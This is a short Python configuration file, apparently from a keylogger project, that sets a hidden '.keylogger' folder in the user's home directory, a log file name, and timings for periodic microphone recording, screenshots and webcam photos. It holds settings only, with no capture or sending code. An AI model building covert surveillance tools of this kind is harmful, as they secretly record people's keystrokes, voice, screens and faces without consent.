import os

# path
name_dir = '.keylogger'
logs_file = 'logs.txt'
user = os.path.expanduser('~')
path = user + '/' + name_dir + '/'

# microphone
microphone_time = 10
microphone_repeat = 60

# screen
screenshots_repeat = 60

# web camera
photo_repeat = 60
photo_width = 1080
photo_height = 1920
camera_index = 0
